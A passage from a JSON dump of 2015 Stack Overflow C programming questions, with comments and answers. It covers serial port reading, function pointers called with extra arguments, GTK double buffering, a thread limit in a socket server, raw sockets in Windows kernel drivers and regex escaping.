\noptions.c_cflag = SPEED | CS8 | CLOCAL | CREAD | IGNPAR;        \ntcflush(fd, TCIFLUSH);        \ntcsetattr(fd, TCSANOW, &amp;options);\n\nFILE *f;\nf = fopen(\"try.txt\", \"a\");\n\n    if (f == NULL)\n    {\n    printf(\"Error opening file!\\n\");\n    exit(1);\n    }\n\nint r;        \nchar buf[255];       \n    while( 1 )\n    {        \n    r = read( fd, buf, 255 );        \n    buf[r]=0;        \n    printf( \"%s\", buf);\n    }\n}\n</code></pre>\n\n<p>New to raspbian etc.. any help would be greatly appreciated.</p>\n"}, {"tags": ["c", "function-pointers"], "comments": [{"owner": {"reputation": 58398, "user_id": 3233393, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/c4c576e0ebcdf0efd653269a5b020347?s=128&d=identicon&r=PG", "display_name": "Quentin", "link": "https://stackoverflow.com/users/3233393/quentin"}, "edited": false, "score": 2, "creation_date": 1437554455, "post_id": 31557919, "comment_id": 51072461, "body": "Did you turn all warnings on ?"}, {"owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "edited": false, "score": 0, "creation_date": 1437554745, "post_id": 31557919, "comment_id": 51072643, "body": "What do you mean by dumped ? Where did  you make a call to your function ?"}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1437555718, "post_id": 31557919, "comment_id": 51073312, "body": "What compiler do you use ?"}, {"owner": {"reputation": 55, "user_id": 2197015, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8c2e8570bb357a78a251a2fb74b13d6d?s=128&d=identicon&r=PG", "display_name": "S1ippery", "link": "https://stackoverflow.com/users/2197015/s1ippery"}, "edited": false, "score": 0, "creation_date": 1437557218, "post_id": 31557919, "comment_id": 51074387, "body": "Looking back over my code I now see that I hadn&#39;t declared the functions with (void) as the arguments in the header file. When I changed this I got warnings. However, it did still compile and run fine. I am using the TI 4.4.4 MSP430 compiler."}], "answers": [{"tags": [], "owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "is_accepted": true, "score": 2, "last_activity_date": 1437560260, "last_edit_date": 1495541649, "creation_date": 1437555493, "answer_id": 31558493, "question_id": 31557919, "link": "https://stackoverflow.com/questions/31557919/function-pointer-arguments-ignored-not-needed/31558493#31558493", "title": "Function pointer arguments ignored/not needed", "body": "<p>This should not compile with modern compilers.</p>\n\n<p>What happens here :</p>\n\n<p><code>start_simulation</code> will be called with a <code>char*</code> argument, but as <code>start_simulation</code> has no argument the argument is simply ignored (or \"dumped\" as you write).</p>\n\n<p>Remember, in C function arguments are pushed onto the stack and the caller cleans up the stack after the call. So if you call a function with no argument pretending it has argument(s), then</p>\n\n<ul>\n<li>the caller pushes the argument(s) onto the stack</li>\n<li>the argumentless function is called by the caller</li>\n<li>the function does it's business ignoring the argument(s) on the stack</li>\n<li>the functions returns to the caller</li>\n<li>the caller cleans up the stack</li>\n</ul>\n\n<p>Have also a look at <a href=\"https://stackoverflow.com/questions/24921319/is-calling-a-c-function-with-extra-arguments-portable\">this SO question</a>.</p>\n"}, {"tags": [], "owner": {"reputation": 119882, "user_id": 3545273, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/RDWxl.png?s=128&g=1", "display_name": "Serge Ballesta", "link": "https://stackoverflow.com/users/3545273/serge-ballesta"}, "is_accepted": false, "score": 1, "last_activity_date": 1437557093, "creation_date": 1437557093, "answer_id": 31559072, "question_id": 31557919, "link": "https://stackoverflow.com/questions/31557919/function-pointer-arguments-ignored-not-needed/31559072#31559072", "title": "Function pointer arguments ignored/not needed", "body": "<p>I assume that either you have declared you functions before using them or you compiler implicitely declared them as (C default) :</p>\n\n<pre><code>int start_simulation();\n...\n</code></pre>\n\n<p>meaning <code>start_simulation</code> should be defined elsewhere as a function taking any parameters and returning an int.</p>\n\n<p>But this should give you at least some warnings, because either the definition is different from the declaration, or the declaration of functions to not match the declaration of command for the second element of a commandstruct (in <code>const commandStruct commands[] = ...</code>)</p>\n\n<p>For the fact that it compiles and runs fine, the cdecl way of passing parameters is as follow :</p>\n\n<ul>\n<li>parameters are pushed to stack in opposite order</li>\n<li>the callee is called (return address of caller is pushed to the stack)</li>\n<li>callee can get its parameters starting at stack pointer + size of the return address but never removes them from the stack</li>\n<li>callee returns</li>\n<li>caller removes the parameters that it pushed to the stack (it knows them)</li>\n</ul>\n\n<p>That means that you can always add unused parameters, provided the compiler is tolerant enough to compile an incorrect call, or the function was declared with an empty parameter list.</p>\n"}], "owner": {"reputation": 55, "user_id": 2197015, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8c2e8570bb357a78a251a2fb74b13d6d?s=128&d=identicon&r=PG", "display_name": "S1ippery", "link": "https://stackoverflow.com/users/2197015/s1ippery"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 665, "favorite_count": 0, "accepted_answer_id": 31558493, "answer_count": 2, "score": 4, "last_activity_date": 1437560260, "creation_date": 1437553939, "question_id": 31557919, "link": "https://stackoverflow.com/questions/31557919/function-pointer-arguments-ignored-not-needed", "title": "Function pointer arguments ignored/not needed", "body": "<p>I'm currently writing C code for a microprocessor and I came across something I couldn't explain. I have implemented a command line interface using function pointers. To do this I have made a struct holding the name of the command, the pointer to the function to be run and also a help description. </p>\n\n<pre><code>typedef void(*command)(char *);\ntypedef struct commandStruct {\n    char const *name;\n    command execute;\n    char const *help;\n} commandStruct;\n\nconst commandStruct commands[] =\n{\n    {\"led\", CmdLed, \"Turns on or off the LED1\"},\n    {\"AT+START_SIM\", start_simulation, \"Starts the simulation\"},\n    {\"AT+STOP_SIM\", stop_simulation, \"Stops the simulation\"},\n    {\"\",0,\"\"} //End of table indicator.\n};\n\nvoid exec_command(char *buffer)\n{\n    uint16 i = 0;\n    char *cmd = buffer;\n    char *args;\n    while (buffer[i])\n    {\n        if(buffer[i] == '=')\n        {\n            buffer[i] = 0;\n            args = buffer + i + 1;\n            break;\n        }\n        i++;\n    }\n\n    uint16 cmdCount = 0;\n    while(strcmp(commands[cmdCount].name,\"\"))\n    {\n        if(!strcmp(commands[cmdCount].name,cmd))\n        {\n            commands[cmdCount].execute(args);\n            break;\n        }\n        cmdCount++;\n    }\n}\n\nvoid start_simulation(void) {run = 1;}\nvoid stop_simulation(void) {run = 0;}\nvoid CmdLed(char *args)\n{\n    P1DIR |= BIT0;\n    if(!strcmp(args,\"on\")) P1OUT = 1;\n    if(!strcmp(args,\"off\")) P1OUT = 0;\n}\n</code></pre>\n\n<p>I have included above the function <code>exec_command</code> which is where the function pointer is used. At the bottom I have also put the <code>start_simulation</code> and <code>stop_simulation</code> functions, along with <code>CmdLed</code>. I wrote <code>CmdLed</code> at an earlier date and then came back and wrote <code>start_simulation</code> and <code>stop_simulation</code>. I had forgotten that I had defined my function pointer as taking a <code>(char *)</code> as an argument. However, I was surprised to find that everything still compiled and ran absolutely fine. Why is this? It seems that any arguments are just 'dumped' and not used.</p>\n"}, {"tags": ["c", "opengl", "gtk", "x11", "gtk3"], "comments": [{"owner": {"reputation": 10424, "user_id": 3408572, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/0f3a08b145553b98749d3d0572d01265?s=128&d=identicon&r=PG&f=1", "display_name": "andlabs", "link": "https://stackoverflow.com/users/3408572/andlabs"}, "edited": false, "score": 1, "creation_date": 1437804114, "post_id": 31557168, "comment_id": 51195245, "body": "Just because it&#39;s deprecated doesn&#39;t mean you can&#39;t use it. It won&#39;t be guaranteed to work in all situations, but that depends on the situation you want. What minimum exact version of GTK+ do you need to support? And if 3.16 is too new, do you need Wayland OpenGL support? What about <a href=\"https://github.com/andrepiske/tegtkgl\" rel=\"nofollow noreferrer\">this</a>?"}, {"owner": {"reputation": 2866, "user_id": 1522056, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/OJh0k.jpg?s=128&g=1", "display_name": "Fabian Knorr", "link": "https://stackoverflow.com/users/1522056/fabian-knorr"}, "reply_to_user": {"reputation": 10424, "user_id": 3408572, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/0f3a08b145553b98749d3d0572d01265?s=128&d=identicon&r=PG&f=1", "display_name": "andlabs", "link": "https://stackoverflow.com/users/3408572/andlabs"}, "edited": false, "score": 0, "creation_date": 1437807373, "post_id": 31557168, "comment_id": 51195830, "body": "That&#39;s right, but usually a feature is deprecated because there is a better solution to the same problem - also I&#39;d like my code to keep working with future versions of GTK+. I&#39;m actually working on a <a href=\"https://github.com/fknorr/gtkglcanvas\" rel=\"nofollow noreferrer\">fork</a> of that repository."}], "owner": {"reputation": 2866, "user_id": 1522056, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/OJh0k.jpg?s=128&g=1", "display_name": "Fabian Knorr", "link": "https://stackoverflow.com/users/1522056/fabian-knorr"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 843, "favorite_count": 0, "answer_count": 0, "score": 3, "last_activity_date": 1437551833, "creation_date": 1437551833, "question_id": 31557168, "link": "https://stackoverflow.com/questions/31557168/gtkwidget-alternative-for-deprecated-double-buffered-property", "title": "GtkWidget: Alternative for deprecated &quot;double-buffered&quot; property?", "body": "<p>I've derived my own widget type from <code>GtkWidget</code> in order to use it as a drawing surface for OpenGL. To give OpenGL control over the underlying X11 Window, I need to disable the widget's double buffering - else the whole rendering result will be drawn over by GTK's buffer swap.</p>\n\n<p>However, <code>gtk_widget_set_double_buffered</code> and the <code>\"double-buffered\"</code> property have been deprecated in the current version of GTK+3 for being too platform-dependent. </p>\n\n<p>Is there a way to disable double buffering on the GDK or X11 level instead?</p>\n"}, {"tags": ["c", "linux", "multithreading", "sockets"], "comments": [{"owner": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "edited": false, "score": 0, "creation_date": 1437553901, "post_id": 31557156, "comment_id": 51072150, "body": "What about <code>&#47;proc&#47;sys&#47;kernel&#47;pid_max</code>? And <code>&#47;proc&#47;sys&#47;kernel&#47;threads-max</code>?"}, {"owner": {"reputation": 18509, "user_id": 939410, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bb161e6bf2e1dded07d3fd921f487334?s=128&d=identicon&r=PG", "display_name": "Art", "link": "https://stackoverflow.com/users/939410/art"}, "edited": false, "score": 1, "creation_date": 1437555042, "post_id": 31557156, "comment_id": 51072830, "body": "Most likely you&#39;re hitting some kind of resource limit, I&#39;d suspect that the default setting for stack size is eating up all your virtual address space in the process. What does stack size from <code>ulimit -a</code> tell you?"}, {"owner": {"reputation": 81, "user_id": 5142290, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/86de6e21e8dda823fbda57184c4cc9eb?s=128&d=identicon&r=PG", "display_name": "Rahul Bhartari", "link": "https://stackoverflow.com/users/5142290/rahul-bhartari"}, "edited": false, "score": 0, "creation_date": 1437555626, "post_id": 31557156, "comment_id": 51073245, "body": "pid_max is 32768 and thread_max is 29138. Stack size is 8192kbytes."}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1437555869, "post_id": 31557156, "comment_id": 51073410, "body": "OT: <code>ln</code> should be of type <code>socklen_t</code> not <code>int</code>."}, {"owner": {"reputation": 81, "user_id": 5142290, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/86de6e21e8dda823fbda57184c4cc9eb?s=128&d=identicon&r=PG", "display_name": "Rahul Bhartari", "link": "https://stackoverflow.com/users/5142290/rahul-bhartari"}, "edited": false, "score": 0, "creation_date": 1437556097, "post_id": 31557156, "comment_id": 51073578, "body": "But how can it eat up the virtual address space with just 382  file descriptors open and doing nothing but waiting using accept call. The program doesn&#39;t go beyond the 382nd connection. If I change the max thread created in the forked process from 1000 to 380. Then the server handles around 9000 connections simultaneously, but hangs after that. Also I wrote a program for UNIX domain sockets which handled 1000 clients per process(server instance) and a total of 10,000 clients running on the same system. But this one just hangs."}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1437556130, "post_id": 31557156, "comment_id": 51073604, "body": "Does <code>service()</code> <code>close()</code> <code>parg-&gt;fd</code> when done?"}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1437556360, "post_id": 31557156, "comment_id": 51073768, "body": "&quot;<i>But the maximum number of threads this process can create never exceeds 382.</i>&quot; you get which error for exactly which call? In case you do not get an error, exactly where does the code block?"}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1437556668, "post_id": 31557156, "comment_id": 51073996, "body": "How would <code>mxsubserver()</code> get beyond the <code>pause()</code> which is called after <code>1000</code> <code>accept()</code>s? It looks like the <code>fork()</code>ed process never ends."}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1437556832, "post_id": 31557156, "comment_id": 51074094, "body": "It is not a good idea to change your question after comments/answers had been given, as this might make those comments/answers ununderstandable."}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1437556848, "post_id": 31557156, "comment_id": 51074106, "body": "I rolled back your last change therefore."}, {"owner": {"reputation": 81, "user_id": 5142290, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/86de6e21e8dda823fbda57184c4cc9eb?s=128&d=identicon&r=PG", "display_name": "Rahul Bhartari", "link": "https://stackoverflow.com/users/5142290/rahul-bhartari"}, "edited": false, "score": 0, "creation_date": 1437556963, "post_id": 31557156, "comment_id": 51074195, "body": "Yes, it closes the fd. I have edited the question and have included the code for service and SIGPIPE signal handler."}, {"owner": {"reputation": 81, "user_id": 5142290, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/86de6e21e8dda823fbda57184c4cc9eb?s=128&d=identicon&r=PG", "display_name": "Rahul Bhartari", "link": "https://stackoverflow.com/users/5142290/rahul-bhartari"}, "edited": false, "score": 0, "creation_date": 1437557283, "post_id": 31557156, "comment_id": 51074448, "body": "The main server when receives Ctrl+C, it kills all its child processes and the program terminates properly. It gives no error, it just stops after 382nd or 381st thread."}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1437557378, "post_id": 31557156, "comment_id": 51074512, "body": "There is a race with passing arguments to the threads if the thread function is slower then <code>accept()</code>ing occurs. You want to move this <code>parg = malloc(sizeof(service_d));</code> inside the <code>for(;;)</code> loop and adjust the calls to <code>free()</code> accordingly, that is move it into the thread function."}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1437557417, "post_id": 31557156, "comment_id": 51074539, "body": "&quot;<i>it just stops</i>&quot; &quot;<i>stops</i>&quot; in the sense of &quot;ends&quot; or does it block? If the latter on which call?"}, {"owner": {"reputation": 81, "user_id": 5142290, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/86de6e21e8dda823fbda57184c4cc9eb?s=128&d=identicon&r=PG", "display_name": "Rahul Bhartari", "link": "https://stackoverflow.com/users/5142290/rahul-bhartari"}, "edited": false, "score": 0, "creation_date": 1437558581, "post_id": 31557156, "comment_id": 51075316, "body": "I implemented your suggestion and placed malloc inside the loop without any success. The program actually kept on accepting the requests but doesn&#39;t create any thread after 382nd accept.Then after accepting 1000th request, server forks another instance and the same is repeated."}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1437561248, "post_id": 31557156, "comment_id": 51077205, "body": "The result returned by read() is not handled fully and correctly.  The assumption that &#39;read(fd,im,l)&#39; will read &#39;l&#39; bytes is invalid and the resulting protocol error is likely to result in grave problems with &#39;read(fd,&amp;l,sizeof(int));&#39;, which can either return a protocol-misaligned int with a value that is larger than your buffer, (which you do not check for - sucks), or simply return less than &#39;sizeof(int)&#39; bytes, (which you do not check for - sucks) which again is liikely to cause a gross read length error/stackoverflow."}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 1, "creation_date": 1437561549, "post_id": 31557156, "comment_id": 51077385, "body": "You MUST handle fully the results returned from system calls like read().  It can be less than 0, (handled in your code - good), 0, (connection closed by peer - not handled in your code - bad), or greater than 0, (number of bytes actually received - not handled in your code -  VERY BAD)."}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1437561627, "post_id": 31557156, "comment_id": 51077434, "body": "Don&#39;t bother worrying about the threading until you have fixed your basic protocol errors."}, {"owner": {"reputation": 81, "user_id": 5142290, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/86de6e21e8dda823fbda57184c4cc9eb?s=128&d=identicon&r=PG", "display_name": "Rahul Bhartari", "link": "https://stackoverflow.com/users/5142290/rahul-bhartari"}, "edited": false, "score": 0, "creation_date": 1437561900, "post_id": 31557156, "comment_id": 51077610, "body": "My client program first writes the length of the buffer and then the message, which is constant and repeats this in a while loop. So this doesn&#39;t cause any problems. And I want the the server to get the SIGPIPE signal for reading a broken pipe when client exists. Therefore I haven&#39;t checked it. In rest of the code read/write will return -1 and break the loop and close the connection, while handler for SIGPIPE will decrement the count and make room for one extra connection."}], "answers": [{"tags": [], "owner": {"reputation": 81, "user_id": 5142290, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/86de6e21e8dda823fbda57184c4cc9eb?s=128&d=identicon&r=PG", "display_name": "Rahul Bhartari", "link": "https://stackoverflow.com/users/5142290/rahul-bhartari"}, "is_accepted": true, "score": 3, "last_activity_date": 1437561522, "last_edit_date": 1495541168, "creation_date": 1437561522, "answer_id": 31560736, "question_id": 31557156, "link": "https://stackoverflow.com/questions/31557156/stream-socket-server-cannot-handle-more-than-382-threadsone-per-connection-in/31560736#31560736", "title": "Stream Socket Server cannot handle more than 382 threads(one per connection) in Linux", "body": "<p>Solved it.</p>\n\n<p>Saw this thread: <a href=\"https://stackoverflow.com/questions/7581257/threads-sockets-limits-in-linux?rq=1\">Threads/Sockets limits in Linux</a></p>\n\n<p>The default stack size is 8MB. When I create 382 threads, total size of the stacks created for all the threads is 8x382 i.e, around 3GB.</p>\n\n<p>Therefore I reduced the stack size to 30KB using <code>pthread_attr_setstacksize</code>.\nNow after connecting to around 6000 clients it must say something like <code>libgcc_s.so.1 must be installed for pthread_cancel to work</code> . This can be solved by running the command: <code>apt-get install libgcc1-dbg</code> as root.</p>\n"}], "owner": {"reputation": 81, "user_id": 5142290, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/86de6e21e8dda823fbda57184c4cc9eb?s=128&d=identicon&r=PG", "display_name": "Rahul Bhartari", "link": "https://stackoverflow.com/users/5142290/rahul-bhartari"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 172, "favorite_count": 1, "accepted_answer_id": 31560736, "answer_count": 1, "score": 4, "last_activity_date": 1437561522, "creation_date": 1437551789, "last_edit_date": 1437557077, "question_id": 31557156, "link": "https://stackoverflow.com/questions/31557156/stream-socket-server-cannot-handle-more-than-382-threadsone-per-connection-in", "title": "Stream Socket Server cannot handle more than 382 threads(one per connection) in Linux", "body": "<p>I am trying to write a server program which forks a process for handling multiple client connections which creates one thread per connection. But the maximum number of threads this process can create never exceeds 382.</p>\n\n<p>Why can't I create more number of threads which handle one file descriptor for communicating with one client while the file descriptor limit per process is 1024 in Linux?</p>\n\n<p>I'm using a system running Kubuntu on Core-i3 with 2GB ram.</p>\n\n<p>Here is the code for main function..</p>\n\n<pre><code>int server_start(void)\n{\nlisten(skid,10000);\nscnt=0;\nprintf(\"Server Listening at port:%d\\n\",serdt.port);\nfor(scnt=0;scnt&lt;1000;)\n{\n        sdata-&gt;cpid[scnt]=fork();\n        switch(sdata-&gt;cpid[scnt])\n        {\n            case -1:    printf(\"Could not Fork\\n\"); break;\n            case  0:    mxsubserver(scnt); exit(0);\n            default:    scnt++; break;\n        }\n//  }\n    //check for other parameters\n    pause();\n}\nwhile(1);\n}\n</code></pre>\n\n<p>Variable not declared in the function are global variables. I have a blank action handler for signal number 50 for breaking out of the pause.</p>\n\n<p>The forked process sends the signal to the parent(this) process when the limit(file descriptor) is reached and then it will fork a new process. Below is the server process code called after fork in above code...</p>\n\n<pre><code>typedef struct\n{\n    int cln;\n    int cnt;\n    int fd;\n    pthread_t ptid;\n}service_d;\n\nvoid mxsubserver(int cln)\n{//cln is the child sub-server number\nint ln,fd,rfp;\npthread_t ptid;\npthread_attr_t attr;\niflag=1;\n\nsub_data = shmat(shmid,NULL,SHM_RND);\n\nsignal(SIGINT,sub_sigint);\nsignal(SIGPIPE,sub_sigpipe);\nsignal(50,SIG_DFL);\nparg = malloc(sizeof(service_d));\nparg-&gt;cln = cln;\ncnt=0;\nprintf(\"Server Instance %d Started\\n\",cln);\nfor(cnt=0;;)\n{\n    if(iflag)\n    {\n        cnt++;\n        ln = (socklen_t)sizeof(struct sockaddr_in);\n        fd = accept(skid,(struct sockaddr *)&amp;sktaddr,&amp;ln);\n        parg-&gt;fd=fd;\n        parg-&gt;cnt=(cln*1000)+cnt;\n        pthread_attr_init(&amp;attr);\n        pthread_create(&amp;(parg-&gt;ptid),&amp;attr,&amp;service,parg);\n        pthread_detach(parg-&gt;ptid);\n        pthread_attr_destroy(&amp;attr);\n        sub_data-&gt;openfd[cln]=cnt;\n    }\n    if(cnt&gt;=1000)\n    {\n        printf(\"Limit Reached\\n\");\n        iflag=getppid();\n        printf(\"Signalling Parent\\n\");\n        kill(iflag,50);\n        iflag=0;\n        pause();\n    }\n    if(cnt==0)\n    {\n        free(parg);\n        exit(0);\n    }\n}\nkill(getppid(),50);\nwhile(1);\nreturn;\n}\nvoid sub_sigint(int sn)\n{\nfree(parg);\nshmdt(sub_data);\nexit(0);\n}\n\nvoid sub_sigpipe(int sn)\n{\ncnt--;\niflag=1;\n}\n\nvoid* service(void *arg)\n{//handle the client requests\nint fd,cln,l,ol;\nchar im[100],*msg=\"This is from Server\\n\";\nservice_d *srd;\n\nsrd = (service_d*)arg;\n//pthread_detach(srd-&gt;ptid);\nfd = srd-&gt;fd;\ncln = srd-&gt;cnt;\nprintf(\"service cln: %d f: %d\\n\",cln,iflag);\nol=strlen(msg);\n\nwhile(1)\n{\n    read(fd,&amp;l,sizeof(int)); //open to get sigpipe error if client closes\n    if(read(fd,im,l)&lt;0) break;\n    im[l]='\\0';\n//  printf(\"Server %d thread %d: Got &gt;&gt; %s\\n\",srd-&gt;cln,cln,im);\n    if(write(fd,&amp;ol,sizeof(int))&lt;0) break;\n    if(write(fd,msg,ol)&lt;0) break;;\n}\nclose(fd);\npthread_exit(\"Done\\n\");\n}\n</code></pre>\n\n<p>Thanks.</p>\n"}, {"tags": ["c", "windows", "sockets", "driver"], "answers": [{"comments": [{"owner": {"reputation": 2009, "user_id": 1087890, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/0f8ec58f46e4af3a67f768675c20aac8?s=128&d=identicon&r=PG", "display_name": "Yang Luo", "link": "https://stackoverflow.com/users/1087890/yang-luo"}, "edited": false, "score": 0, "creation_date": 1437558989, "post_id": 31557478, "comment_id": 51075624, "body": "It seems to be right, but I didn&#39;t find the function to send raw packets? TCP packets can be sent using <code>SendData</code> and UDP packets use <code>SendDatagram</code>. It&#39;s best if an example can be provided."}], "tags": [], "owner": {"reputation": 9854, "user_id": 1741450, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f7900ed57a92b336effd879fa61de226?s=128&d=identicon&r=PG", "display_name": "lucasg", "link": "https://stackoverflow.com/users/1741450/lucasg"}, "is_accepted": true, "score": 2, "last_activity_date": 1437552722, "creation_date": 1437552722, "answer_id": 31557478, "question_id": 31557005, "link": "https://stackoverflow.com/questions/31557005/how-to-send-raw-socket-packets-using-winsock-kernel-wsk-in-kernel-mode-driver/31557478#31557478", "title": "How to send raw socket packets using Winsock Kernel (WSK) in kernel-mode driver?", "body": "<p><code>WskSocket</code> support <code>TCP</code>, <code>UDP</code> and \"raw sockets\" for custom IP paquets : <a href=\"https://msdn.microsoft.com/en-us/library/windows/hardware/ff571149%28v=vs.85%29.aspx\" rel=\"nofollow\">https://msdn.microsoft.com/en-us/library/windows/hardware/ff571149%28v=vs.85%29.aspx</a></p>\n\n<blockquote>\n  <p>SocketType [in]</p>\n\n<pre><code>The type of socket that is being created. The following socket types are supported:\n\nSOCK_STREAM\n\n    Supports reliable connection-oriented byte stream communication.\nSOCK_DGRAM\n\n    Supports unreliable connectionless datagram communication.\nSOCK_RAW\n\n    Supports raw access to the transport protocol.\n</code></pre>\n</blockquote>\n"}], "owner": {"reputation": 2009, "user_id": 1087890, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/0f8ec58f46e4af3a67f768675c20aac8?s=128&d=identicon&r=PG", "display_name": "Yang Luo", "link": "https://stackoverflow.com/users/1087890/yang-luo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1307, "favorite_count": 2, "accepted_answer_id": 31557478, "answer_count": 1, "score": 2, "last_activity_date": 1437552722, "creation_date": 1437551417, "question_id": 31557005, "link": "https://stackoverflow.com/questions/31557005/how-to-send-raw-socket-packets-using-winsock-kernel-wsk-in-kernel-mode-driver", "title": "How to send raw socket packets using Winsock Kernel (WSK) in kernel-mode driver?", "body": "<p>I am developing a <strong>kernel-mode driver</strong> for Win7 and later. I want to send <strong>custom IP packets</strong> in the driver (I want to specify all fields for IP layer). I found the <strong>Winsock Kernel (WSK)</strong> technique but it only said how to send and receive TCP and UDP packets. I know that in user-mode, there is <strong>raw socket</strong> in WinSock API. So I wonder <strong>if there is also a raw socket interface for Winsock Kernel</strong>? Thanks.</p>\n"}, {"tags": ["c", "regex"], "comments": [{"owner": {"reputation": 481661, "user_id": 3832970, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/64323e6cf08401474da3bf770ea13b58?s=128&d=identicon&r=PG&f=1", "display_name": "Wiktor Stribi\u017cew", "link": "https://stackoverflow.com/users/3832970/wiktor-stribi%c5%bcew"}, "edited": false, "score": 0, "creation_date": 1437551412, "post_id": 31556982, "comment_id": 51070656, "body": "Double the escape <code>\\</code> symbol."}, {"owner": {"reputation": 139, "user_id": 5120033, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/8513bff1e2921aa850d95d788a363a3d?s=128&d=identicon&r=PG&f=1", "display_name": "Sri Kant", "link": "https://stackoverflow.com/users/5120033/sri-kant"}, "reply_to_user": {"reputation": 481661, "user_id": 3832970, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/64323e6cf08401474da3bf770ea13b58?s=128&d=identicon&r=PG&f=1", "display_name": "Wiktor Stribi\u017cew", "link": "https://stackoverflow.com/users/3832970/wiktor-stribi%c5%bcew"}, "edited": false, "score": 0, "creation_date": 1437551599, "post_id": 31556982, "comment_id": 51070778, "body": "Adding double escape like shown does not help reti = regcomp(&amp;regex, 